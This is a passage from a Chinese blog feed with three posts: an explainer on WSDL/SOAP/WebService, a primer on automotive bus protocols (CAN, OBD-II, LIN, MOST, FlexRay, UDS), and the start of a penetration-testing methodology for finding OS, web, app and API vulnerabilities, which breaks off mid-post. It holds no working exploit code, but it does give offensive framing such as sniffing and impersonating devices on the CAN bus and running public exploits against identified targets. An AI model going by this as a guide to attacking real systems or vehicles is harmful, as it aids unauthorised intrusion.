    <content type="html"><![CDATA[<h1 id="wsdl-soap以及webservice"><a class="markdownIt-Anchor" href="#wsdl-soap以及webservice"></a> WSDL、SOAP以及WebService</h1><p>什么是WebService、什么是SOAP以及什么是WSDL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">soap: Simple Object Access Protocol.(简单对象访问协议)</span><br><span class="line">wsdl: Web Service Description Language.(Web服务描述语言)</span><br></pre></td></tr></table></figure><p>参考：<a href="https://zhuanlan.zhihu.com/p/383326629">https://zhuanlan.zhihu.com/p/383326629</a> ，<a href="https://blog.csdn.net/dzqxwzoe/article/details/129221428">https://blog.csdn.net/dzqxwzoe/article/details/129221428</a></p><h2 id="webservice"><a class="markdownIt-Anchor" href="#webservice"></a> WebService</h2><p>WebService有着狭义和广义的定义：</p><p>广义的来说，WebService就是字面意思：Web+Service，也就是服务(Service)网络(Web)化的意思；它力求的是跨语言和跨平台的、基于Web传输的远程调用能力。</p><p>它没有强调远程调用使用什么协议，所以我们可以自由选择，比如SOAP协议或者常见的基于http的json化的数据传输协议。</p><p>关于广义的定义更为深入和具体的介绍，可以参看大V阮一峰的这篇博客，就不再过多介绍了，狭义的来说，我们经常谈的WebService是指基于SOAP协议实现的远程服务调用模型；</p><p><a href="https://link.zhihu.com/?target=http%3A//www.ruanyifeng.com/blog/2009/08/what_is_web_service.html">Web service是什么？ - 阮一峰的网络日志www.ruanyifeng.com/blog/2009/08/what_is_web_service.html</a></p><h2 id="soap"><a class="markdownIt-Anchor" href="#soap"></a> SOAP</h2><p>SOAP定义了数据交互中如何传递消息的规则；</p><p>比如在http中规定了post请求的传参方式，在数据类型不同的情况下可以使用不同的参数方式；其中在form格式下是<code> key=v&amp;key1=v1</code>，同样SOAP也是定义这些东西的；</p><h2 id="wsdl"><a class="markdownIt-Anchor" href="#wsdl"></a> WSDL</h2><p>同样的，当我们用http方式去调用一个服务的时候，我们只是知道通用的http协议的传参方式还是不够的，我们仍然需要知道目标服务的接口文档；这就是WSDL，每个服务都有的<strong>接口文档</strong>。</p><p>在http上可能就是我们手写的一个wiki文档，而在SOAP中就是一个用WSDL规范编写的WSDL文档，每个服务是有能力自动生成这个文档的，其中WSDL规范了这个文档该怎么写；</p><p>那么我们一般如何阅读WSDL文件呢？——WSDL文档都是<strong>从下往上</strong>阅读的。先看最底下的service标签，查看其中port标签的binding属性值，然后通过值查找上面的binding标签</p><h3 id="定义"><a class="markdownIt-Anchor" href="#定义"></a> 定义</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">definitions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">types</span>&gt;</span></span><br><span class="line">       definition of types........</span><br><span class="line">       数据类型定义的容器，它使用某种类型系统(一般地使用XML Schema中的类型系统)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">types</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">        definition of a message....</span><br><span class="line">通信消息的数据结构的抽象类型化定义。使用Types所定义的类型来定义整个消息的数据结构。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">portType</span>&gt;</span></span><br><span class="line">        definition of a port.......</span><br><span class="line">对于某个访问入口点类型所支持的操作的抽象集合，这些操作可以由一个或多个服务访问点来支持。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">portType</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">binding</span>&gt;</span></span><br><span class="line">        definition of a binding....</span><br><span class="line">特定端口类型的具体协议和数据格式规范的绑定。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">binding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span>&gt;</span></span><br><span class="line">        相关服务访问点的集合。</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servie</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">definitions</span>&gt;</span></span><br></pre></td></tr></table></figure><p>举个小李子</p><h2 id="综上所述"><a class="markdownIt-Anchor" href="#综上所述"></a> 综上所述</h2><p>综上所述</p><ul><li>SOAP可以类比http协议：定义了方式</li><li>WSDL可以类比一个http服务的接口文档；</li></ul><p>在了解了WebService、SOAP以及WSDL相关概念以后, 接着我们的目标便是用ksoap2来发起网络请求获取数据了。</p><p>举个小例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">wsdl:binding</span> <span class="attr">name</span>=<span class="string">&quot;WeatherWebServiceSoap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;tns:WeatherWebServiceSoap&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">soap:binding</span> <span class="attr">transport</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/http&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">wsdl:operation</span> <span class="attr">name</span>=<span class="string">&quot;getWeatherbyCityName&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">soap:operation</span> <span class="attr">soapAction</span>=<span class="string">&quot;http://WebXml.com.cn/getWeatherbyCityName&quot;</span> <span class="attr">style</span>=<span class="string">&quot;document&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">wsdl:input</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">soap:body</span> <span class="attr">use</span>=<span class="string">&quot;literal&quot;</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">wsdl:output</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">wsdl:operation</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">wsdl:binding</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;wsdl-soap以及webservice&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#wsdl-soap以及webservice&quot;&gt;&lt;/a&gt; WSDL、SOAP以及WebService&lt;/h1&gt;
&lt;p&gt;什么是WebService、什</summary>
      
    
    
    
    <category term="开发基础" scheme="https://j3f5.github.io/categories/%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>车联网基础-协议</title>
    <link href="https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/"/>
    <id>https://j3f5.github.io/articles/2023/06/12/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/</id>
    <published>2023-06-12T02:19:22.000Z</published>
    <updated>2023-06-15T02:19:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="can协议"><a class="markdownIt-Anchor" href="#can协议"></a> CAN协议</h1><p>总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其中之一，它常常配合着OBD-II连接器出现。</p><p>CAN协议有高速车线和低速车线</p><ul><li>高速（CANH）：RPM控制</li><li>中低速（CANL）：门把所、空调</li></ul><p>这意味着当信号进来时，CAN提高一条线上的电压，并降低另一条线上的电压。这种差分信号用于必须容错噪声的环境中，例如汽车系统和制造业。当一个位在CAN总线上传输时，信号将同时广播高1V和低1V。传感器和ECU有一个收发器，检查以确保两个信号都被触发;如果不是，收发器将数据包作为噪声拒绝。</p><p>两根双绞线组成总线，要求总线两端端接。在终端两端的两根电线上有一个120欧姆的电阻。如果模块不在总线的末端，则不必担心终止。作为一个可能窃听线路的人，你唯一需要担心的是，如果你为了嗅探线路而拆除了终端设备。</p><h2 id="工作原理"><a class="markdownIt-Anchor" href="#工作原理"></a> 工作原理</h2><p>CAN总线的通信通过一种类似于“<strong>会议</strong>”的机制实现的，只不过会议的过程并不是由一方（节点）主导，而是<strong>每一个会议参加人员都可以自由的提出会议议题</strong>（多主通信模式）。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111013955.png" alt="image-20230615111013955" style="zoom:80%;" /><p>CAN总线的优点：</p><ul><li>通信速率最高可达1MB/s（此时距离最长40m）。节点数实际可达110个。</li><li>采用短帧结构，每一帧的有效字节数为8个。</li><li>每帧信息都有CRC校验及其他检错措施，数据出错率极低。</li><li>通信介质可采用双绞线，同轴电缆和光导纤维，一般采用廉价的双绞线即可，无特殊要求。节点在错误严重的情况下，具有自动关闭总线的功能，切断它与总线的联系，以使总线上的其他操作不受影响。</li></ul><h2 id="obd-ii连接器找can总线"><a class="markdownIt-Anchor" href="#obd-ii连接器找can总线"></a> OBD-II连接器找CAN总线</h2><p>许多车辆配备了一个OBD-II连接器，也被称为诊断链路连接器（DLC），它与车辆的内部网络进行通信。你通常会发现这个连接器在转向柱下或隐藏在仪表盘的其他地方，在一个相对容易接近的地方。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image4.jpg" alt="Diagram showing where the OBDII is located inside a vehicle" style="zoom: 25%;" /><p>在搜索电缆时很容易找到 CAN，因为它的静止电压为 2.5V。当信号进来时，它会增加或减少 1V（3.5V 或 1.5V）。 CAN 线贯穿车辆并连接 ECU 和其他传感器，它们始终采用双线对。如果连接万用表并检查车辆中的电线电压，您会发现它们将静止在 2.5V 或波动 1V。如果您发现一根电线以 2.5V 电压传输，几乎可以肯定是 CAN。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230612104520243.png" alt="image-20230612104520243" style="zoom: 67%;" /><p>在图中，6号和14号引脚用于标准的高速CAN线（HS-CAN）。中速和低速通信发生在其他引脚上。一些汽车使用CAN的中速（MS-CAN）和低速（LS-CAN），但许多车辆对这些通信使用不同的协议。你会发现，并非所有的总线都通过OBD-II连接器暴露出来。你可以使用接线图来帮助定位额外的 &quot;内部 &quot;总线线路。</p><h2 id="can数据包组成"><a class="markdownIt-Anchor" href="#can数据包组成"></a> CAN数据包组成</h2><p><strong>标准</strong></p><p>每个CAN总线数据包包含四个关键元素：</p><ol><li>仲裁ID：仲裁ID是一个广播信息，用于识别试图进行通信的设备的ID，尽管任何一个设备可以发送多个仲裁ID。如果两个CAN数据包同时沿总线发送，则仲裁ID较低的数据包获胜。</li><li>标识符扩展（IDE）：对于标准的CAN，该位总是0。</li><li>数据长度代码（DLC）：这是数据的大小，范围从0到8字节。</li><li>数据：这就是数据本身。一个标准的CAN总线数据包所携带的数据的最大尺寸可以达到8字节，但有些系统通过填充数据包来强制要求8字节。</li></ol><p><strong>拓展</strong></p><p>扩展数据包与标准数据包一样，<strong>只是它们可以被串联起来以创建更长的ID</strong>。扩展数据包被设计成适合于标准的CAN格式，以保持向后的兼容性。因此，如果一个传感器不支持扩展数据包，那么如果另一个数据包在同一网络上传输扩展的CAN数据包，它就不会中断。</p><p>标准数据包在使用标志方面也与扩展数据包不同。当查看网络转储中的扩展数据包时，你会发现与标准数据包不同，扩展数据包使用替代远程请求（SRR）来代替远程传输请求（RTR），并将SSR设置为1。 他们也会将<strong>IDE设置为1</strong>，而且他们的数据包会有一个18位的标识符，这是标准11位标识符的第二部分。还有一些特定于某些制造商的CAN风格的协议，它们也是向后兼容标准CAN的，与扩展CAN的方式基本相同。</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230612104714733.png" alt="image-20230612104714733" /></p><p>因为<strong>CAN总线数据包是广播</strong>的，所以同一网络上的所有控制器都能看到每个数据包，有点像以太网上的UDP。包集不携带有关哪个控制器(或攻击者)发送了什么的信息。因为任何设备都可以看到和传输数据包，所以<strong>总线上的任何设备都可以模拟任何其他设备</strong>。</p><h2 id="can数据包标准"><a class="markdownIt-Anchor" href="#can数据包标准"></a> CAN数据包标准</h2><h3 id="iso-tpiso-15765-5"><a class="markdownIt-Anchor" href="#iso-tpiso-15765-5"></a> ISO-TP（ISO 15765-5）</h3><p>此标准的主要作用在 <strong>诊断+KWP消息（CAN的一种替代协议）</strong>，当然也可以在发送大量数据包的时候使用 。接受拓展CAN数据包。</p><blockquote><p>为了将ISO TP封装进CAN，将CAN数据字段首字节用于<strong>扩展寻址</strong>，所以只剩下7个字节用于传输数据本身。通过ISO TP发送大量信息容易引起<strong>泛洪</strong>，因此在繁忙的总线上传输信息需要小心。</p></blockquote><h3 id="canopen"><a class="markdownIt-Anchor" href="#canopen"></a> <a href="https://baike.baidu.com/item/CANopen/2700924?fr=aladdin">CANopen</a></h3><p><strong>CANopen</strong>是一种架构在控制局域网络控制局域网络（Controller Area Network, CAN）上的高层通信协议，包括通信子协议及设备子协议，常在嵌入式系统中使用，也是工业控制常用到的一种现场总线。</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/format,f_auto.jpeg" alt="img" style="zoom:67%;" /><p>该协议是CAN协议的另一种扩展协议。其特点如下：</p><ol><li>数据包构造改变</li><li>通信是有大量总裁ID为：<code>0x0</code></li><li>11位标识符分解为：4个功能码+7位节点ID</li><li>仲裁ID附近有一个确定的结构，例如心跳协议的消息格式：<code>0x700 + 节点ID</code></li></ol><blockquote><p><strong>心跳协议</strong>（Heartbeat protocol）是用来监控网络中的节点及确认其正常工作。心跳信息的生产者（一般是 slave 设备）周期性的送出功能码 1110、ID 为本身节点 ID 的讯息，信息的数据部分有一个表示节点状态的位。而心跳信息的消费者负责接收上述数据，若在指定时间（于设备的对象字典中定义）内，消费者均未收到信息，可采取相应动作（例如显示错误或重置该设备）。</p></blockquote><h2 id="gmlan总线"><a class="markdownIt-Anchor" href="#gmlan总线"></a> GMLAN总线</h2><p>是汽车中CAN总线的实现。基于ISO-TP，与UDS协议（统一诊断服务）类似。</p><p>组成：一条低速+两条高速</p><ul><li>低速：33.33Kbps+32节点</li><li>高速：500Kbps+16节点</li></ul><h1 id="sae-j1850协议pwm-vpm"><a class="markdownIt-Anchor" href="#sae-j1850协议pwm-vpm"></a> SAE J1850协议（PWM VPM）</h1><p>特点就是老旧，很少用了，简单介绍一下。</p><p>两种类型+3中速率（ABC）：</p><ol><li><p>PWM脉宽调制</p><ol><li>引脚2和10运行差分信号，5V高电压，双线差分信号</li><li>1为高信号，0为低</li></ol></li><li><p>VPM可变脉冲调制</p><ol><li><p>引脚2，单线总线，7V高电压</p></li><li><p>数据包格式：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615102305571.png" alt="image-20230615102305571" style="zoom:67%;" /><ul><li>PPP：优先级，111最低</li><li>H：起始字节大小，0为3字节，1为单字节</li><li>K：帧内响应，0为需求，1为不允许</li><li>Y：寻址模式，0为功能，1为物理</li><li>ZZ：消息类型</li></ul><p>帧内响应（IFR）数据会紧跟VPM后面，有EOD/EOF信号作为结束</p></li></ol></li></ol><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615100342475.png" alt="image-20230615100342475" style="zoom:80%;" /><h1 id="关键字协议kwp2000与iso-9141-2"><a class="markdownIt-Anchor" href="#关键字协议kwp2000与iso-9141-2"></a> 关键字协议（KWP2000）与ISO 9141-2</h1><p>KWP使用引脚7，消息最多包含255字节，有两个变种（主要在初始化）：</p><ul><li>ISO 14230-4 KWP（5波特的初始化）</li><li>ISO 14230-4 KMP（快速初始化）</li></ul><p>ISO 9141-2或K-Line是KWP的变种，使用引脚7，14为备选。</p><h1 id="局域互联网协议lin"><a class="markdownIt-Anchor" href="#局域互联网协议lin"></a> 局域互联网协议（LIN）</h1><p>作为CAN的补充，成本最低。特点如下：</p><ul><li>没有仲裁码/优先级代码，由单独主节点负责传输</li><li>最多支持16个从节点，监听主节点并实时响应。而主节点连接CAN</li><li>工作在12V电压的单线总线，不接入OBD</li><li>帧格式如下，Header由主节点发送，其余主/从节点都可发送</li></ul><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615103350855.png" alt="image-20230615103350855" style="zoom:80%;" /><p>注：</p><ol><li>ID表示消息类型，有64种可能性，ID60与ID64为诊断信息。当读取诊断信息时，8字节用于诊断，第一个字节被称为诊断节点地址（NAD）。字节的前部分为ISO标准定义，后半部分为厂商设备独有。</li></ol><h1 id="面向媒体的系统传输most"><a class="markdownIt-Anchor" href="#面向媒体的系统传输most"></a> 面向媒体的系统传输（MOST）</h1><p>使用与媒体设备，其特点在于：</p><ol><li><p>环形拓扑/虚拟星拓扑，有MOST设备作为定时的主设备，连续发送数据帧，最多支持64个MOST设备。</p><ol><li>除了主设备，其他都有分配地址，支持即插即用</li></ol></li><li><p>MOST分为三种速率：MOST25 / 50 / 150。使用的材料不同，定位不同。</p></li><li><p>MOST 总线利用光脉冲传输数据，采用环形结构，<strong>在环形总线内只能朝着一个方向传输数据</strong></p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615110310507.png" alt="image-20230615110310507" style="zoom:67%;" /></li><li><p>每个MOST帧有三个通道：</p><ol><li>同步域：流数据（音/视频）</li><li>异步域：分组数据（TCP/IP）</li><li>控制域：控制和低速数据（HMI）</li></ol></li></ol><h2 id="most网络层"><a class="markdownIt-Anchor" href="#most网络层"></a> MOST网络层</h2><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615104520680.png" alt="image-20230615104520680" style="zoom:80%;" /><h2 id="破解most"><a class="markdownIt-Anchor" href="#破解most"></a> 破解MOST</h2><p>可以通过一个支持该协议的设备，如IVI或者车载MOST控制器进行破解。工具为：most4linux，可以：</p><ol><li>most_aplay播放wav文件</li><li>ctrl_tx 发送一条广播控制消息并检查其状态</li><li>sync_tx 实时传输</li><li>sync_rx 实时接收</li></ol><h1 id="flexray"><a class="markdownIt-Anchor" href="#flexray"></a> FlexRay</h1><p>是一种高速总线，传输速率高达10Mpbs，用于时间敏感的通信，例如线控驱动、线控转向、线控啥车。其实现成本高于CAN。所以FlexRay高端，CAN中端，LIN低端。</p><p>与CAN类似，为总线型拓扑结构，也与以太网类似，支持星型拓扑结构。专为车内联网设计，采用基于时间触发机制</p><p>FlexRay总线<strong>工作原理</strong>：FlexRay总线数据收发采取<strong>时间触发和事件触发</strong>的方式。</p><ul><li>利用时间触发通信时，网络中的各个节点都预先知道彼此将要进行通信的时间， 接收器提前知道报文到达的时间，报文在总线上的时间可以预测出来。</li></ul><p>它采用了周期通信的方式，一个通信周期可以划分为<strong>静态部分</strong>、<strong>动态部分</strong>、<strong>特征窗</strong>和<strong>网络空闲</strong>时间4个部分。</p><ul><li><strong>静态部分</strong>和<strong>动态部分</strong>用来传输总线数据，即FlexRay报文。</li><li><strong>特征窗</strong>用来发送唤醒特征符和媒介访问检测特征符。网络空闲时间用来实现分布式的时钟同步和节点参数的初始化。</li></ul><h1 id="汽车以太网"><a class="markdownIt-Anchor" href="#汽车以太网"></a> 汽车以太网</h1><p>正在逐步替代上述协议，为了能够让车联网真正地适配。例如CAN可以封装成UDP包。</p><h1 id="obd-ii连接引脚图"><a class="markdownIt-Anchor" href="#obd-ii连接引脚图"></a> OBD-II连接引脚图</h1><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111458202.png" alt="image-20230615111458202" style="zoom:80%;" /><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111523022.png" alt="image-20230615111523022" style="zoom:67%;" /><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/image-20230615111543026.png" alt="image-20230615111543026" style="zoom:67%;" /><h1 id="诊断服务uds-obd-kwp"><a class="markdownIt-Anchor" href="#诊断服务uds-obd-kwp"></a> 诊断服务（UDS OBD KWP）</h1><p>ISO 14230的OBD七层模型和ISO 14229的增强型诊断七层模型</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1lZenhtNjY=,size_16,color_FFFFFF,t_70.png" alt="img" /></p><p>增强型诊断：</p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/format,png.png" alt="img" style="zoom: 70%;" /><p>首先，OBD（汽车排放和驱动性相关）和增强型诊断（面向整车所有ECU）都属于系统级，拥有完整的七层模型。</p><p>其次，USD作为服务，处于模型的应用层和会话层。</p><p>而KWP2000作为汽车专用协议，处于模型的第4层至第1层。</p><p>另外，CAN因为使用较广泛，关于汽车的ISO 15765处于第4层至第3层。而通用的底层协议ISO 11898处于第2层至第1层。</p><p>所以，我们可以理解为OBD系统调用了UDS、KWP2000、CAN这些协议。而这些协议也能够被别的系统调用，组成新的七层模型。</p><p>OBD通过服务号（SID）调用相关UDS的服务，然后UDS根据应用的底层（K-Line、CAN-bus等）调用KWP2000或CAN。</p><p>即：</p><ol><li>OBD作为系统，自上而下，标准庞大而清晰。</li><li>UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。</li><li>OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。</li><li>UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。</li></ol><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><p>CAN总线是中坚，LIN总线是CAN总线的副手，FlexRay总线是未来的希望，MOST总线则负责车载多媒体业务。而随着车辆ECU的增多，车辆网络拓扑结构也越来越负责，比如说一辆车需要有多种总线（CAN总线，LIN，以太网，FlexRay）</p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FmbXpodQ==,size_16,color_FFFFFF,t_70.png" alt="img" /></p><p><img src="/images/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%8D%8F%E8%AE%AE/%E8%BD%A6%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE.png" alt="车联网协议" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;can协议&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#can协议&quot;&gt;&lt;/a&gt; CAN协议&lt;/h1&gt;
&lt;p&gt;总线协议通过车辆的网络控制数据包的传输。其中有成百上千的传感器与我们的车辆系统相连接，总线协议的选择至关重要，CAN协议就是其</summary>
      
    
    
    
    <category term="车联网基础" scheme="https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="协议" scheme="https://j3f5.github.io/tags/%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>漏洞发现-操作系统、WEB应用、APP应用与API接口服务安全</title>
    <link href="https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/"/>
    <id>https://j3f5.github.io/articles/2023/06/08/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/</id>
    <published>2023-06-08T06:00:59.000Z</published>
    <updated>2023-06-08T06:00:59.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><ol><li>为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp</li><li>漏洞类型&amp;危害条件？知道危害条件就可以先做好准备，例如得到低权限shell等等，看他是权限提升漏洞还是什么漏洞，就可以方便我们达成目标</li><li>如何做好未卜先知？做好信息搜集</li></ol><p>此部分包含四个部分：如下</p><h2 id="操作系统"><a class="markdownIt-Anchor" href="#操作系统"></a> 操作系统</h2><p>一般都通过指纹来识别操作系统，还有一个特别古早的方法：Linux分大小写但是Windows不分</p><h2 id="web应用"><a class="markdownIt-Anchor" href="#web应用"></a> WEB应用</h2><p>其实都差不多的思路，首先去找公开漏洞，不行就自己审计。</p><h3 id="已知-cms"><a class="markdownIt-Anchor" href="#已知-cms"></a> 已知 CMS</h3><p>如常见的 dedecms，discuz，wordpress 等源码结构，这种一般采用非框架类开发，但也有少部分采用的是框架类开发，针对此类源码程序的安全检测，我们要</p><ul><li><strong>利用公开的漏洞进行测试</strong></li><li>如不存在可<strong>自行搭建环境，采用白盒代码审计自行挖掘</strong>。</li></ul><h3 id="开发框架"><a class="markdownIt-Anchor" href="#开发框架"></a> 开发框架</h3><p>如常见的 thinkphp，spring，flask 等开发的源码程序，这种源码程序正常的安全测试思路：</p><ol><li>先获取对应的开发框架信息(名字，版本)，通过<strong>公开的框架类安全问题进行测试</strong></li><li><strong>如不存在可采用白盒代码审计自行挖掘</strong></li></ol><h3 id="未知-cms"><a class="markdownIt-Anchor" href="#未知-cms"></a> 未知 CMS</h3><p>如常见的企业或个人内部程序源码，也可以是某 CMS 二次开发的源码结构，针对此类的源码程序测试思路：</p><ol><li>能识别<strong>二次开发就按已知CMS 思路</strong>进行</li><li>不能确定二次开发的话可以采用<strong>常规综合类扫描工具</strong>或脚本进行探针，也可以采用<strong>人工探针</strong>（功能点，参数，盲猜）</li><li>同样在有源码的情况下也可以进行代码审计自行挖掘</li></ol><h2 id="app应用"><a class="markdownIt-Anchor" href="#app应用"></a> APP应用</h2><p>一般来说，做了适应性的app都可以使用类似于web渗透的方法进行攻击，除非是采用特定的框架，采用非适应性（也就是用web浏览器打开不太行，不能做到适配，例如以此为开头的一般都是适应性的：<code>m.xxx.com</code>）</p><h2 id="api接口服务安全"><a class="markdownIt-Anchor" href="#api接口服务安全"></a> API接口服务安全</h2><p>分清api接口的类别，一般xml就是web service，而json就是restful。尽量找到wsdl的配置文件，看入口函数以及参数定义，这样子就能够构造数据包（使用postman也行，使用soapui啥的也行），构造完之后就是正常的渗透测试流程了，不太一样就是把这个包的参数都要自己摸索传输，而web传输我们抓包可以模仿一下~</p><h1 id="操作系统漏洞发现"><a class="markdownIt-Anchor" href="#操作系统漏洞发现"></a> 操作系统漏洞发现</h1><p>学会使用一些工具：Nessus、Nmap、Goby。通过扫描的结果。</p><ol><li>判断操作系统信息，版本、类型等</li><li>判断操作系统开放端口</li><li>查找历史漏洞，冲就完事了</li></ol><h1 id="web应用漏洞发现"><a class="markdownIt-Anchor" href="#web应用漏洞发现"></a> WEB应用漏洞发现</h1><h2 id="识别web应用"><a class="markdownIt-Anchor" href="#识别web应用"></a> 识别WEB应用</h2><p>看上面是分三类，所以主要是如何去测定这个是什么CMS或者是什么框架开发的。这个测定方法一般有：</p><p><img 